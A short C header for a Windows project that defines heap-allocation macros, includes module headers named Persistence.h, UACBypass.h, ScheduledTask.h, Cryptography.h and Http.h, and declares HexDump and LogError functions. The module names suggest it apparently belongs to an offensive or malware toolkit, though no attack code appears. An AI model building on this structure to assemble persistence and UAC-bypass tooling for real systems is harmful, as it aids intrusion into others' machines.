#pragma once

#define ALLOC(X) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, X)
#define FREE(X) HeapFree(GetProcessHeap(), 0, X)
#define REALLOC(X, Y) HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, X, Y)

#include "Macros.h"
#include "Filesystem.h"
#include "Process.h"
#include "Random.h"
#include "Gui.h"
#include "Wmi.h"
#include "ScheduledTask.h"
#include "String.h"
#include "Time.h"
#include "Cryptography.h"
#include "Hash.h"
#include "Curve25519.h"
#include "Persistence.h"
#include "UACBypass.h"
#include "SystemInfo.h"
#include "Service.h"
#include "Registry.h"
#include "Http.h"

VOID HexDump
(
	_In_ PBYTE pBuffer,
	_In_ DWORD cbBuffer
);

VOID LogError
(
	_In_ LPWSTR lpFormat,
	...
);